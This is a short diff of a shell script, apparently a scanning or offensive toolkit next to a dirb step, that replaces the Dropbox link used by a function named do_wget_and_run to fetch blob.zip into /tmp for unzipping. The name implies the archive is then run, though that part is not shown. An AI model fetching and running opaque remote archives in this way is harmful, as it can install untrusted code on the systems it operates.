@@ -65,7 +65,7 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    FILE_URL="https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&st=em7ud3pb&dl=1"
+    FILE_URL="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
     OUTPUT_FILE="/tmp/blob.zip"
     UNZIP_DIR="/tmp/"
 
